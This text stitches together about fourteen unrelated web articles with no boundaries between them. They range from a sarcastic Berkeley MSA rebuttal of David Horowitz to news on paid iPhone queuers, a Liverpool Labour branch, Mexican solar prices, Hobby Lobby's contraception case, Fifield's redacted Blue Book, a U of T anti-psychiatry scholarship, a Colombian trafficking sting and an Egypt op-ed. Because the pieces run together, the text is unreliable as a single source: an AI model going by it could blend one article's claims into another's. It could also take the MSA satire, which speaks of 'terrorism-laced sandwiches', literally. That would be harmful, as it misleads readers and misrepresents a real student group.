Muslim Student Association Responds To Accusations of David Horowitz
My name is Bilaal Ahmed, and I'm the former leader of your local jihadist organization, the Muslim Student Association (MSA) at UC Berkeley. I don't know if you noticed, but two weeks ago my cover was blown by a paid political advertisement in the Daily Cal from David Horowitz's Freedom Center, which revealed that we, the MSA, are a "campus front group for jihad." To think that the hard work of Muslims in America over the past 40 years to construct this front could be uncovered so easily pains me greatly.
I am writing to admit to you, attentive reader, that Horowitz once again is absolutely correct just like he was this past October with Islamo-Fascism Awareness Week. Unfortunately, we are still waiting for a terrorist state to be established so that we can all devote our lives to it and place its well-being above our own.
Since Horowitz already let the cat out of the bag, let me tell all of you just a few ways your MSA at Berkeley has supported terror this past year: We made terrorism-laced sandwiches on Sproul to give to homeless people at least once a month, hoping that they would join our cause; we organized a team of 70 Muslims to participate in Relay for Life on behalf of the American Cancer Society, hoping that one day we will be able to use cancer as a biological weapon; we held a charity event and raised $1,000 for Save the Children (of terrorists, of course). Oh, and before I forget, we've occasionally held ice cream socials, dinners, bowling nights, barbeques, broom-balling, ski trips and get this, we play football on some Fridays to pretend that we love America. As you can easily tell, all our activities are designed to foster extremely close relationships among the members of our terrorist organization so that when one of us goes out for a jihadi terrorist mission, we can all get super depressed when they do not come back alive.
We also spearheaded a massive campaign to recruit others to stand in solidarity with our terrorist cause. We had to do this in the most creative manner possible so we voiced our concern as the need for "peace" (May God protect us from it!). You may have heard of the so-called "Peace Not Prejudice Week." Unfortunately, our plan backfired and we ended up uniting groups for the "worthy" cause of peace and not prejudice which was by no means our intention. We preferred the slogan "Prejudice Not Peace," but that did not seem to go over well with other members of the coalition.
Not to mention we also host weekly self-betterment series for our members, in which we help them hone their terrorism skills and encourage open dialogue about issues in Islam-oh I am sorry-Islamo-Fascism. We are currently working on expanding our services to include TIP, the Terrorism Improvement Project, in an effort to network with other local terrorists and help our members reach out to leaders in the greater terrorist community. TAP (Terrorism Awareness Project), take that!
Clearly, MSA is just not doing a good enough job of hiding its terrorist activities. In fact, we would like to thank Horowitz for spending so much of his own private funding and time on an ad that got us free publicity and landed us on the map. If you see our table on Sproul, please stop by, ask questions and leave with a better sense of terrorism in Berkeley. Oh and don't forget to pick up some pamphlets about Islamo-Fascism and give them to your friends!
PASADENA (CBSLA.com/AP) — Several homeless people Friday were being paid to stand in line for the release of the iPhone 5C and 5S.
The phones went on sale at Apple and other retail stores at 8 a.m.
Pasadena police told KNX 1070's Jon Baird that many people in line at the Colorado Boulevard store were recruited from downtown Los Angeles.
Homeless Reportedly Being Paid To Camp Out For iPhone 5C, 5S
“I was asked yesterday if I would be willing to sit in line for someone so they could get a phone. I said, ‘Sure, I've got nothing else to do.' So I'm here,” said Mickie, who was driven to Pasadena, along with 10 others.
It was unclear how much Mickie was being compensated, however. Others said they were being paid as little as $35 to wait in line for hours.
Vouchers were given out to those who were in line by 6 a.m
“They dropped us, sit in line, get the vouchers and then we'll be paid,” she added.
“The phones are for me and I have a company that resells them,” a man, who paid each homeless person $20 per voucher, said. The unidentified entrepreneur said he then sells the phones overseas for approximately $1,000 each.
Two men were arrested by Pasadena police for fighting in public over the vouchers, but it was mostly peaceful for the rest of the crowd.
“It's just something you need to have,” said fan Francisco Naranjo, who began camping outside of the Pasadena store on Sunday night.
The iPhone 5C is now available in five colors — green, blue, yellow, pink and white.
CEO Tim Cook calls it “more fun and colorful” than any other iPhone. The 5C has a 4-inch Retina display and is powered by Apple's A6 chip. It also has an 8 megapixel camera, live photo filters and a rear cover that lights up.
The iPhone 5C costs $99 for a 16-gigabyte model and $199 for a 32-gigabyte model with a two-year wireless contract.
The company also released a more expensive model, the iPhone 5S, in three colors — black, silver and gold. The device ranges from $199 to $399, depending on the amount of memory.
“It has a new fingerprint reader so it's going to be able to lock your phone and other features. It's going to have a faster processor, it's going to be a faster phone,” Naranjo said.
The new phones were available online at 12:01 a.m.

Jeremy Corbyn supporters have won control of a Liverpool Labour group - ousting a council cabinet member and demanding an apology from MP Luciana Berger.
At a meeting of the Wavertree Labour branch last night, nine out of 10 positions on the group's executive committee went to members of Momentum - the campaign group loyal to the Labour leader - or Corbyn supporters.
And a member of the new branch leadership immediately demanded an apology from Wavertree MP Luciana Berger , who resigned from Mr Corbyn's shadow cabinet last year in the wake of the EU referendum result.
In response, Ms Berger has released a joint statement with the new group secretary, which heaps praise on Mr Corbyn and his recent election result.
Among the figures voted out of position last night was Liverpool council cabinet member Frank Hont, who lost his role to Spirit of Shankly member and anti-S*n campaigner Roy Bentham .
He and the other new CLP executive members say they want to work with Ms Berger, but said she will be accountable to them on future decisions.
Mr Bentham said: “Luciana needs to get on board quite quickly now.
“She will now have to sit round the table with us the next time she wants to vote for bombing in Syria or to pass a no confidence motion in the leader of the party - she will have to be answerable to us.
“We would like her to come out publicly like other MPs have done and apologise for not supporting him in the past.”

Following last year's shadow cabinet walk-out, Mr Corbyn easily fended off a leadership challenge by Owen Smith.
He went on to produce a shock result in last month's General Election, coming from 20 points behind in the polls to produce stop the Tories from securing an overall majority.
Mr Bentham added: “What happened in Wavertree sends out a clear message about the effect Jeremy has had and shows other branches in Liverpool and Merseyside what people who are enthused by his politics can achieve.
“There was about 160 members there last night and the atmosphere was crackling, it's one of the biggest attendances I have seen in many years of those meetings.”

In a show of unity, Ms Berger has released a joint statement with Angela Kehoe Jones, which shows clear support for Mr Corbyn.
It states: “The Labour Party In Liverpool Wavertree is a vibrant, democratic organisation with around 1,800 members. Quite rightly, the members elect officers of the party to oversee its work.
“We are united in wanting to secure a new General Election and the return of a Labour government under the leadership of Jeremy Corbyn as soon as possible.
“We had a great local result on June 8, with the Labour majority going up for the third election in a row and almost four in five people voting for Luciana Berger as the Labour candidate. That is thanks to the hard work of local members and a revitalised national party under Jeremy Corbyn.
“It is a fantastic foundation for the next General Election, whenever it comes.”

It was an amazing experience to hear kids talking about these issues. This movie can have a real impact on the way we think about what we're eating. – Alice Waters , chef, author and founder of the Edible Schoolyard
This film is charming beyond belief and covers a lot of great stuff. Thanks for making it. – Marion Nestle , author of Food Politics: How the Food Industry Influences Nutrition and Health
We are, for the first time in our history, at the unenviable moment when our unhealthy diet and lack of education surrounding our food supply, has combined to foment the perfect storm that is taking us toward extinction. If we do not change what we feed our children and teach them about their food supply and the symbiotic relationship between a healthy planet, healthy food and healthy bodies - this path will become a reality. "What's On Your Plate" will provide a first step in our education, which just might curb this trajectory and possibly save our children, their planet and all of our future. – Chef Ann Cooper , author of Lunch Lessons: Changing the Way We Feed Our Children
What's on your plate? Well, what's on your ballot... So much of what we eat in America has to do with choices we make in the political realm. Unfortunately the under 18 constituencies that is so affected by our food policy choices doesn't get to vote. I think this film will go far in focusing our attention on the way we're feeding the next generations. – Aaron Woolf , filmmaker of the critically acclaimed King Corn
I've been lobbying for more than 15 years on children's health issues, and it's easy to get frustrated with the opposition on Capitol Hill, in state legislatures, or even local jurisdictions. The task is helping policymakers understand and see all sides of an issue. I believe it's time for the messengers to change. And there are no better messengers than kids themselves. One of the things I love about the film is the natural curiosity and all the questions that arise. We as adults, while we need to guide kids and provide direction, also need to step out of the way and provide room for young people to testify, share their stories, ask the right questions and ultimately demand change. – Kimberly Perry , of the Alliance for a Healthier Generation

Mexico is on track to generate the world's cheapest solar power — with prices as low as 1.77¢/kWh, according to Mexico's Centro Nacional de Control de Energía (Cenace). Mexico's Department of Energy recently announced the companies selected to complete new renewable power projects, and the rates at which this electricity will be sold. The lowest price for solar in Mexico has been set just below that of Saudi Arabia at 1.77¢/kWh, and is expected to continue to decrease to 1¢/kWh in 2019 or sooner. In this most recent bidding round, 15 bids from eight solar and wind energy companies, including Canadian Solar, ENEL Green Power, and Mitsui, were approved in a sign that Mexico's renewable surge is not slowing down.
The clean energy projects recently approved by Mexico will be online and selling power by 2020. These projects and others are important steps towards meeting Mexico's goals under the Paris agreement as well as regional goals established by Mexico, the United States, and Canada. In 2016, all three countries pledged to source 50 percent of their power from renewable sources by 2025. Canada is on track to meet this goal while Mexico continues to build up its renewable portfolio. As it was when the regional pledge was made, the United States still lags behind in its transition to clean energy.

Mexico's achievement of cheap solar energy exceeds the expectations of skeptics who believed that such a price in a country like Mexico, rather than one like wealthy Saudi Arabia, would be highly unlikely. Despite its economic challenges, Mexico is proving that affordable renewable energy is possible around the world, brightening the prospects of the Paris agreement even as the United States refuses to participate. If current trends continue, the world may soon be faced with the prospect of plentiful, clean, affordable energy, the possibilities for which are endless.

There are a lot of gaming titles coming up in the next four months, and many of them have enormous potential. But the one I'm starting to look forward to the most is Far Cry 3.
It's especially odd because I wasn't a big fan of the original game, and thought the reboot/sequel was a bit iffy.
But Ubisoft has been showing they've got a mix of good ideas and a willingness to try new things that may make it stand out, especially in a crowded genre.
Here's what I've been seeing that catches my attention.
#4) So Far It Has Just the Right Balance of Gritty and Ridiculous
This is a game where you struggle for your life against armed, dangerous terrorists… and also a game where, if you go swimming, you'll probably wind up punching a shark. You'll be fighting scary mercenaries… and also explore an elaborately design ancient temple. It's a bit like Michael Bay's idea of Heart of Darkness.
#3) You're Not a Marine, Cyborg, Or Other Superhero
You're a tourist whose friends have been captured by an insane terrorist drug dealer. Ubisoft has also made it clear that by the end of the game, your character is going to be a very, very damaged and scary person. And that's great. You so rarely see in-game actions having a genuine emotional effect on your character. It could be cheesy as hell but at least they're trying.
#2) You Have Multiple Ways of Solving Problems, Including Feeding Enemies to Bears
I've mentioned before that having multiple ways to complete an objective is important in modern games. So far we've seen our hero sic a bear on terrorist, leave a bunch of land mines lying around for them to find, stealthily kill everyone in a compound, and walk in guns blazing.
In short, you make your own fun.
#1) Restoring Health Has Potentially Serious Risks
One of the odder aspects of the game that Ubisoft has been discussing is the fact that your character, not to put too fine a point on it, trips balls.
It turns out there's a reason for that:
In other words, restoring health is not about pressing a button and filling a meter. There's a cost and a potentially huge risk. It's a small change, a seemingly minor mechanic, but it forces the player to either find a place to hide until the effects wear off, or have to fight with a severe disability.
That's something I didn't know I wanted until I saw it. That mechanic changes how to play the game completely, because being a tank now carries much more risk.
It shows there's a level of thought here that's worth looking at. The game comes out in early December, and I'll have a review for you then.
The dreaded “Freshman 15,” the “Sophomore 20” – with holiday season well under way and winter semester in full swing, hundreds of thousands of college students – from first year to graduate school – are facing the same reality: academic life is hectic. With busy class schedules, intense study, clubs, volunteering, the party scene, and more, the lack of both time and money means health and fitness take a back seat.
From fitness expert Dempsey Marks and nutrition guru Olivia Weinstein comes PREGAME FIT. Available today, PREGAME FIT is a one-of-a-kind, researched-based, 12-week fitness program designed specifically to address the three key barriers preventing young adults from exercising – Time, Space and Affordability.
Best friends and recent college graduates, Marks and Weinstein know from personal experience the challenges young adults face. Receiving her fitness certification while she was still a college student, Marks worked as a personal trainer in her university wellness center, gaining even further understanding of the unique needs of her millennial peers.
“College was awesome. But staying fit was a challenge,” says Dempsey Marks. “With late hours, parties, an empty wallet, cheap fast food, and constant demands on my time, it was almost impossible to get to the gym. We wanted to create a lifestyle program that anyone can work into their schedule – no matter how little time, money or space they have. PREGAME FIT is that program – setting young adults up with healthy habits and balance that can last a lifetime.”
In this interview Dempsey talked to me about her experience creating a fitness program.
Ysmay: Where did you come up with the idea of Pregame Fit? Where did the inspiration come from?
Dempsey: The idea for PreGame Fit actually came about when we were discussing how we integrate healthy living into our own hectic schedules. Both of us were constantly being asked “How do you maintain your fitness and physique while balancing work, school, and socializing?” We answered the question so many times that we finally realized that there was a market for this type of product. So many health and fitness plans are extreme and that can be very discouraging to people with busy schedules. We originally were inspired to create a Workout and Nutrition Guide that was compatible with the college lifestyle. In the process of writing it we realized that a fitness plan that accommodated the chaotic lifestyle of a college student, would be effective in producing results for any and all demographics. Hence, we set about to make a Workout and Nutrition Guide that could easily be integrated into people's daily lives.
What sets Pregame Fit apart from the other fitness sites/programs out there?
PreGame Fit, unlike so many other fitness plans, is about balance—not extremes. We created PreGame Fit to specifically address the three barriers that most often prevent people from living healthy lives—time, space, and affordability. Our workouts are all 30 minutes or less in duration (most people don't have the luxury of working out several hours a day). The strength workouts can be completed in as little as a 5×5 foot space and don't require a gym membership or expensive equipment. As for the nutrition plan, nothing is off limits, which is rare in a society where fad diets are popping up left and right.
Tell me about your nutrition plan. You say nothing is off limits, so how are people going to prevent weight gain?
The PreGame Fit Nutrition plan utilizes a technique called portion control. Believe it or not, the key to maintaining a healthy weight is portion control—not dieting. It allows for flexibility in your diet because nothing is off limits. How does this prevent weight gain? Well, it's all about (you guessed it) controlling your portions and not overeating. We advocate implementing portion control specifically with high-calorie foods (like pizza, burgers, pasta, etc) and bulking up your meal with low-calorie, nutrient-rich foods (like unlimited fruits and veggies). This technique allows you to feel like you're eating just as much food as you would usually eat. We believe that allowing for no restrictions in your diet helps create a healthier relationship with food. Eat healthy when you can and indulge when you want to!
What's the workout like? Yoga? Weights? Aerobics?
The strength workouts are the backbone of the PGF workout plan. They utilize a technique called high-intensity circuit training that combines strength and cardio to provide maximum results in minimum time. Each strength workout consists of 4 7-minute circuits. Each circuit consists of 3 exercises which you perform back-to-back for 7 minutes straight with little to no rest. Studies actually show that high intensity circuit training is more effective than traditional strength training. Plus, all of the workouts exercise your entire body so no muscle group will get overly fatigued.
What do you hope people to get out of the program?
The most important thing that we want people to take from this program is that healthy living is attainable and sustainable. It doesn't have to be an all-or-nothing lifestyle. Our program is all about balancing fitness and health with work and fun. Healthy living shouldn't be overwhelming or stressful. Rather it should enhance the quality of your everyday life.

(Reuters) - A federal judge has temporarily exempted Hobby Lobby Stores Inc from a requirement in the 2010 healthcare law that it offer workers insurance coverage for birth control, which the retailer said violated its religious beliefs.

The preliminary injunction issued by U.S. District Judge Joe Heaton in Oklahoma City, where Hobby Lobby is based, covers the arts and crafts chain and its affiliated Mardel Christian bookstore chain.
He put the case on hold until October 1, giving the federal government time to decide whether to appeal a June 27 decision by a federal appeals court in Denver to let Hobby Lobby challenge the mandate on religious grounds.
A U.S. Department of Justice spokesman had no immediate comment. The government has said contraception coverage is needed to promote public health and gender equality.
The Becket Fund for Religious Liberty, a nonprofit law firm representing Hobby Lobby, said there are 63 lawsuits nationwide challenging the mandate.
It said Hobby Lobby is the largest company to be excused, at least temporarily, from having to comply. Hobby Lobby has 556 stores in 45 U.S. states, and has about 13,000 employees.
The Green family, which owns Hobby Lobby, had argued that providing coverage to workers for the morning-after pill and similar contraceptives violated its Christian beliefs.
It also said it could have under Obamacare faced $1.3 million in daily fines by not providing such coverage.
In a written order, Heaton said the size of those penalties, the “substantial” public policy issues involved, and the amount of similar litigation justified an injunction for Hobby Lobby.
“There is a substantial public interest in ensuring that no individual or corporation has their legs cut out from under them while these difficult issues are resolved,” Heaton said at a hearing, according to the Becket Fund.
In its June 27 ruling, the Denver appeals court said there was a good chance that Hobby Lobby would ultimately prevail.
It said Hobby Lobby had “drawn a line at providing coverage for drugs or devices they consider inducing abortions, and it is not for us to question whether the line is reasonable.”
Lori Windham, senior counsel for the Becket Fund, said in an interview that Heaton's decision “shows that companies can be protected from the mandate, and continue to exercise their religious beliefs in the way they run their businesses.”
The case is Hobby Lobby Stores Inc et al v. Sebelius et al, U.S. District Court, Western District of Oklahoma, No. 12-01000.
news Communications Minister Mitch Fifield today released a version of the ‘Blue Book' incoming ministerial briefing he received from his department when he became Communications Minister, with the sections relating to the National Broadband Network having been heavily redacted.
When new Ministers are sworn in to lead government portfolios, they receive extensive briefings on those portfolios from their departmental bureaucrats. Known as ‘Red Books' for a returning Government or ‘Blue Books' for a new Government, the briefing documents contain a wealth of information about the new Minister's portfolio, commitments, decisions and so on.
In Fifield's case, the Blue Book ministerial briefing is particularly important, as it will detail the current state of play within the Government with respect to key policies and projects such as the National Broadband Network. Fifield also took over responsibility for copyright and Internet piracy policy as part of his appointment, with the Arts portfolio returning to the Communications Ministry at the time.
As Communications Minister, Malcolm Turnbull refused to release his Blue Book briefing.
Today, following FOI requests from Delimiter and other organisations, the Department of Communications and the Arts released Minister Fifield's Blue Book. The document is lengthy and has been released in a number of parts, relating separately to Senator Fifield's communications and arts portfolios.
However, the document heavily redacts sections dealing with the National Broadband Network, which is the most high-profile portfolio responsibility that Fifield holds.
For example, the first seven pages of the Blue Book briefing, dealing with immediate portfolio issues — many of which are likely to relate to the NBN — have been completely redacted under Section 47C of the Freedom of Information Act, which allows documents to be exempt from disclosure if they relate to deliberative processes of a department or a Minister.
The rest of the document is similarly littered with S47C exemptions, particularly in areas relating to the NBN.
The redactions mean that it is effectively impossible to ascertain what advice the Department has provided to the incoming Communications Minister about virtually any aspect of the NBN project or the wider policy environment in which the project operates.
A cursory examination of the Arts portfolio side of the Blue Book briefing reveals that little information about the Government's Internet piracy or Internet censorship-related programs has been included in the Blue Book briefing; or if so, it has largely been redacted.
In large part, the broad swathe of information provided as part of the Blue Book release is information that is already in the public domain, meaning that the document has little value in serving the public interest by levelling the debate and giving the public access to a similar level of information about the NBN policy and project as the Communications Minister of the day.
opinion/analysis
What we're seeing here is very clear, and very consistent with Minister Fifield's approach as a politician.
The Minister appears to have taken the approach of avoiding controversy by withholding the release of his Blue Book briefing under FOI legislation, at a time when some of his colleagues have already released their own documents.
However, at the same time, any interesting information (as far as I can see) actually included in the document has been broadly redacted.
With this approach, Fifield neuters both anyone seeking to attack him for not releasing the document, while also neutering the impact of releasing any potentially sensitive information. It's a classic Fifield-style approach: You comply, but in a way that you choose, thus avoiding any real public controversy. It's a smart political approach, and demonstrates how Fifield has gotten to his current position in high office.
It's very hard to imagine the careful and patient Fifield making the sort of gaffes we've seen from fellow Ministers such as Jamie Briggs and Peter Dutton recently … Fifield is far too smart for that.
However, of course there are significant public interest issues with this approach. For starters, it is far from clear that it is at all legitimate for the Department to redact whole pages — even whole sections! — of the Blue Book to keep them from the public eye. It would have been much more appropriate to redact individual words, where they were sensitive, or perhaps paragraphs.
This approach would have met the demands of the FOI Act in a more appropriate way.
By redacting the document as it has, the Department has shown a high level of disdain for the aims of the FOI Act, and for the cause of transparency in the public interest.
But then, that is hardly unusual. In 2016, it is readily apparent that the Freedom of Information Act has very little bite and effectiveness. It is no longer a useful tool for getting information out of the Federal Government; its main use appears to be mainly reminding the bureaucrats in the public service and advisors in Ministers' offices that the public exists at all.
As one further note: It is important to see here how the Government works in real life in terms of FOI requests. Technically it is up to the Department — not the Minister — to decide whether to release documents under FOI law. Yet we see here a situation where only two years ago, the Department categorically blocked the release of a Minister's Blue Book. Today it has reversed that decision and released one.
How are these opposing decisions to be reconciled through interpretation of the FOI Act? The truth is that they probably cannot. The opposing decisions just two years apart make it clear that the Minister, and the political situation and broader landscape at hand, have an influence in whether documents are released under FOI law. That is a troubling situation, and one that I hope FOI decision-makers within the Government are considering seriously.

As Bonnie Burstow sees it, there's no such thing as mental “illness,” no evidence that psychological problems stem from physical imbalances in the brain, and even less that treatments like anti-psychotic drugs actually help people.
But PhD students who follow the University of Toronto professor's radical ideas have a tough time winning financial support: arguing that mental health care as we know it should be abolished can be a hard sell.
So Burstow has put up $50,000 of her own money and convinced the U of T to back a striking new scholarship – for studies in “anti-psychiatry.”
The university defends the grant as an embodiment of academic freedom, but the controversial initiative is raising questions about just how far that freedom should extend.
This is a case where academic freedom should be quashed
Burstow says her grant gives new legitimacy to a burgeoning field, and notes that many of the donors — who so far have matched her commitment with another $12,000 — are ”survivors” of psychiatric treatment or their parents.
“When they send it and they say, ‘I wish I could send more, but you're saving the lives of those not yet born,' you know that donation meant a lot to them,” she said. “A quite large number are parents of kids who have been hurt by psychiatry and want to see this line of research encouraged.”
Critics, however, worry the university is endorsing an anti-scientific, anti-intellectual exercise – a false attempt at “balance” that could inadvertently convince some patients to eschew treatment and put their lives at risk.
Indeed, the scholarship has won support from an organization founded by the Church of Scientology, zealous foes of psychiatry.
[np_storybar title=”Barbara Kay: U of T's ‘antipsychiatry' scholarship — and not believing in mental illness — is an attack on science” link=”http://news.nationalpost.com/full-comment/barbara-kay-u-of-ts-antipsychiatry-scholarship-and-not-believing-in-mental-illness-is-an-attack-on-science”%5D
[/np_storybar]
“This is a case where academic freedom should be quashed,” Edward Shorter, a U of T professor and expert in the history of psychiatry, states bluntly. “People will read this and think ‘Well, maybe mother doesn't need that psychiatrist after all, it's just a lot of bunkum.' And then the first thing you know, someone has committed suicide.”
Dr. Joel Paris, a McGill University psychiatrist who does not hesitate to criticize elements of his own specialty, said he was “ashamed” the Toronto institution would endorse a scholarship dismissing the whole field.
While there is much unknown about psychiatry and problems with how it is sometimes practiced, the scientific foundation of mental illness and its treatment is undeniable, he said.
“We don't have an anti-neurology scholarship or an anti-hepatology scholarship. Psychiatry is the only specialty that has people trying to abolish it,” said Paris. “This doesn't make sense.”
But a spokesman for the university's Ontario Institute for Studies in Education (OISE), home to Burstow and the scholarship, said the project flows from the right of academics to freely research even unpopular ideas.
Psychiatry's tenets and claims do not stand up to scrutiny. We do not have to begin by trying to prove that
And all disciplines should be open to critical analysis, said Charles Pascal, an applied psychology professor at OISE. He cited widespread concerns, for instance, about over-medication of conditions like ADHD,
“The best of us live in a grey zone,” he said. “The best of us do not say black-and-white things about how good any profession is.”
And yet Burstow herself, who has a doctorate in educational theory with a minor in psychology, does not subscribe to a grey area on the topic. She denies the anti-psychiatry label implies any pre-conceived notions or that non-scientists are unqualified to study the area – because it's already well established mental illness does not exist.
“Psychiatry's tenets and claims do not stand up to scrutiny. We do not have to begin by trying to prove that,” said Burstow. “I am saying these are not diseases … There is not a single proof of a single chemical imbalance of a single so-called mental illness.”
Shorter and Paris said such statements are simply “absurd,” that thousands of scientific studies – now incorporating sophisticated imaging of the brain – bolster the idea that biology is behind many psychological conditions and that various treatments do, in fact, work.
While controversy in the past often centred around involuntary commitment of psychiatric patients – epitomized by the Ken Kesey novel and 1975 movie, One Flew Over the Cuckoo's Nest – the vast majority of treatment today is voluntary, and institutionalization relatively rare, said Paris.
Even electro-convulsive therapy, portrayed by Kesey as almost an instrument of torture, has won support recently, with research suggesting new, safer versions of the technology can help severely depressed patients who are unresponsive to other therapy.

SALT LAKE CITY - Utah Attorney General Sean Reyes quietly made a trip to Colombia to participate in the takedown of a child sex trafficking operation.
The trip to Cartagena, done in secret in October, gave Reyes a first-hand view of human trafficking, as little girls intended to become sex slaves were paraded in front of him.
"There were 54 girls ranging in age from 10 to 16 and they were expecting to have sex with all these Americans who came," Reyes said in an interview with FOX 13.
Reyes, posing as the security guard for an American buyer, said he struggled to keep composure as men were offering to buy and sell the children who had been effectively kidnapped from their families. He acted as a translator, going between Spanish and English, buying time for law enforcement officers and the Colombian military to move in.
"At one level, it was tremendously gratifying to start to bring these people to justice," Reyes said. "Also, extremely moving to help liberate little girls and be able to tell them that they're going to go back and see their families."
The sting operation, put together by the non-profit group "Operation Underground Railroad," involved members of the Utah Attorney General's Office, and U.S. and Colombian authorities. Reyes did not announce the trip, nor did he inform many members of his own office. He said he did not want it to be viewed as campaigning.
The experience, he said, has prompted him to make combating human trafficking a priority in his office.
"The attorney general understands that, sure, we do this operation in Colombia, but he understands that this comes back and feeds our state and every state," said Tim Ballard, the founder of Operation Underground Railroad.
The group estimates millions of children are swept up in a business that generates billions.
"Thousands of kids are being smuggled into the U.S. every year, forced into sexual slavery, labor slavery," Ballard said. "It's a big deal."
Reyes said human trafficking is a problem in Utah. He points to the arrest of Victor Rax, accused of sexually assaulting young boys and forcing them to work in the drug trade. Reyes said several human trafficking cases remain under investigation by his office.
In the interview with FOX 13, Reyes got emotional as he reflected on being able to see the girls taken into safe hands.
"It's gratifying," he said, choking back tears. "To be in an area where you can make a difference right away."

As you may know, Matt Damon is starring in a movie called The Great Wall, in which he plays a European mercenary in medieval China who saves the country from giant monsters. (It's not a documentary.)
Naturally, the film, which opens in America on Friday, has come under attack by those who are, you know, tired of the same old white savior narrative that we're used to seeing all the time, but don't worry! Matt Damon, who is always up for a thoughtful discussion on the racial implications of media and diversity, has very thoughtfully responded to the criticism by basically saying “Nuh uh!!” a bunch of times.
Well, just in case you think Matt Damon has not been recognized enough for all that he has done for the Chinese and broader East Asian community, (much like that other unsung hero, Scarlett Johansson) there is still hope. With the movie about to hit theaters, denizens of Twitter have been taking the opportunity to thank Matt Damon for all the impact he has had on Asian culture with the hashtag #ThankYouMattDamon (just don't get it confused with all the white people who are out there unironically thanking the actor for Good Will Hunting and shit).

Wow. Let's give him a standing ovation.
"Open source" is an exciting concept in the world of software and beyond. But it shouldn't be applied to contexts where it makes no sense.
What does open source mean? That's an increasingly tough question to answer because the term is now being applied everywhere and to everything — which is not good.
To understand why open source is losing its meaning, you have to start by tracing the origins of the phrase.
Open source was a term originally used in the intelligence community. It had nothing to do with software.
Then, in 1998, a group of people who advocated the free sharing of software source code coined the term open source software. They did so primarily because they sought an alternative to free software, the term that was initially used to describe software whose source code was freely available.
For political reasons not worth discussing here, some people today continue to prefer the term free software. By and large, however, open source software has become the de facto way to describe software with freely redistributable source code.
The Complex Meaning of Open Source
Over the past two decades, the meaning of open source has become complicated.
This is true even when people talk about open source software. The terms of open source software licenses vary widely, and, by extension, so do the ways in which a software program that is described as open source can be shared.
As a result, when you hear the term open source software, there is some ambiguity regarding what is being discussed. You might be talking about software like Linux, which is governed by the GNU General Public License (GPL)'s rather strict redistribution terms. Or you could be discussing programs like X Windows, which is licensed under very liberal terms.
Open Source beyond Software
The variation within the meaning of open source software is only one reason why the meaning of open source has become hard to pin down in recent years.
The bigger issue is that open source is now being applied to myriad other realms, which have nothing to do with software.
We now talk about open source music, open source art, open source hardware and even open source food and sofas (yes, your sofa can now be open source).
In some cases, it makes sense to apply the open source label to products that are not software. If users can participate in the creation, modification and redistribution of a product, then it qualifies as open source.
In other cases, however, the term is misused.
The types of misuse fall into three main categories:
Referring to a product that is free for anyone to use, but cannot be modified. For example, Archive.org has an “open source audio” page (that's what the URL calls it, at least). The audio files there are free for anyone to download and use in almost any way they like, including incorporating them into a larger product. However, the audio files aren't available in a way that makes it practical for users to modify them. They are an example of a product that is free of cost and freely redistributable, but not extendable or modifiable by third parties. Saying open source when you really mean customizable. Ikea's so-called open source sofa falls into this category. People who want to buy the sofa can customize it before Ikea sends it to them. But the end product is not designed to be modified or redistributed by the user. A truly open source sofa would be one that end users could take apart, reassemble and extend when they got it home — and share it with their friends, too, if they want. The open source model does not really work for sofas. Using open source as a shorthand for crowd-sourced or collaborative. This project is an example. It was a crowd-sourced effort to collect information about debt associated with graduate school in a Google Sheet. Many people contributed, and the results are available for anyone to reuse. But users aren't going to modify the information in the database — that would undercut its purpose. They may add to it, but adding more to something that already exists without modifying any of the existing parts is not an open source endeavor. You could write a plugin for a closed-source software program without touching the program itself just as easily as you could write a plugin for an open source platform.
When open source is used in one of these ways, its meaning degrades.
Conclusion
Open source is one of the most important ideas today in the world of IT and beyond.
If open source is going to remain so influential, however, it needs to be used only in contexts where it truly makes sense. If what you really to say is free of cost, customizable or collaborative, don't say open source. Open source software and other open source entities usually have these qualities, but they have others, too.

The careful rituals of washing before prayers in the mosque, the strict moral code, along with the understanding that life has an ultimate purpose and meaning, keep hundreds of millions of destitute Muslims from despair. The fundamentalist ideology that rises from oppression is rigid and unforgiving. It radically splits the world into black and white, good and evil, apostates and believers. It is bigoted and cruel to women, Jews, Christians and secularists, along with gays and lesbians. But at the same time it offers to those on the very bottom of society a final refuge and hope. The massacres of hundreds of believers in the streets of Cairo signal not only an assault against a religious ideology, not only a return to the brutal police state of Hosni Mubarak, but the start of a holy war that will turn Egypt and other poor regions of the globe into a caldron of blood and suffering.
The only way to break the hold of radical Islam is to give its followers a stake in the wider economy, the possibility of a life where the future is not dominated by grinding poverty, repression and hopelessness. If you live in the sprawling slums of Cairo or the refugee camps in Gaza or the concrete hovels in New Delhi, every avenue of escape is closed. You cannot get an education. You cannot get a job. You do not have the resources to marry. You cannot challenge the domination of the economy by the oligarchs and the generals. The only way left for you to affirm yourself is to become a martyr, or shahid. Then you will get what you cannot get in life — a brief moment of fame and glory. And while what will take place in Egypt will be defined as a religious war, and the acts of violence by the insurgents who will rise from the bloodied squares of Cairo will be defined as terrorism, the engine for this chaos is not religion but the collapsing economy of a world where the wretched of the earth are to be subjugated and starved or shot. The lines of battle are being drawn in Egypt and across the globe. Adli Mansour, the titular president appointed by the military dictator of Egypt, Gen. Abdul-Fattah el-Sisi, has imposed a military-led government, a curfew and a state of emergency. They will not be lifted soon.
The lifeblood of radical movements is martyrdom. The Egyptian military has provided an ample supply. The faces and the names of the sanctified dead will be used by enraged clerics to call for holy vengeance. And as violence grows and the lists of martyrs expand, a war will be ignited that will tear Egypt apart. Police, Coptic Christians, secularists, Westerners, businesses, banks, the tourism industry and the military will become targets. Those radical Islamists who were persuaded by the Muslim Brotherhood that electoral politics could work and brought into the system will go back underground, and many of the rank and file of the Muslim Brotherhood will join them. Crude bombs will be set off. Random attacks and assassinations by gunmen will puncture daily life in Egypt as they did in the 1990s when I was in Cairo for The New York Times, although this time the attacks will be wider and fiercer, far harder to control or ultimately crush.
What is happening in Egypt is a precursor to a wider global war between the world's elites and the world's poor, a war caused by diminishing resources, chronic unemployment and underemployment, overpopulation, declining crop yields caused by climate change, and rising food prices. Thirty-three percent of Egypt's 80 million people are 14 or younger, and millions live under or just above the poverty line, which the World Bank sets at a daily income of $2 in that nation. The poor in Egypt spend more than half their income on food — often food that has little nutritional value. An estimated 13.7 million Egyptians, or 17 percent of the population, suffered from food insecurity in 2011, compared with 14 percent in 2009, according to a report by the U.N. World Food Program and the Egyptian Central Agency for Public Mobilization and Statistics (CAPMAS). Malnutrition is endemic among poor children, with 31 percent under 5 years old stunted in growth. Illiteracy runs at more than 70 percent.
